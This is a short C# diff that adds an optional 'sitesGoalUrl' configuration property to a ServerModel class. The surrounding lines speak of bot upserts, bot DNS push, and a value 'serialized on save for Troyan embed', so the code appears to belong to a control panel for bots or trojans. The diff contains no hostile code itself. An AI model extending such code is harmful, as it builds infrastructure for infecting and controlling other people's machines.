@@ -73,6 +73,12 @@ public class ServerModel : BaseModel
 
     [JsonPropertyName("landingFtp")] public string LandingFtp { get; set; }
 
+    /// <summary>
+    /// Optional sites-host goal URL, e.g. <c>http://4tube.xyz/internal/track/goal</c>.
+    /// Empty = do not notify sites after bot upsert. Not the bot <see cref="TrackUrl"/>.
+    /// </summary>
+    [JsonPropertyName("sitesGoalUrl")] public string SitesGoalUrl { get; set; } = "";
+
     /// <summary>First public IPv4 for bot DNS push; evaluated live, serialized on save for Troyan embed.</summary>
     [JsonPropertyName("primaryDns")]
     public string PrimaryDns => ServerNetworkRefinement.GetPrimaryDns();
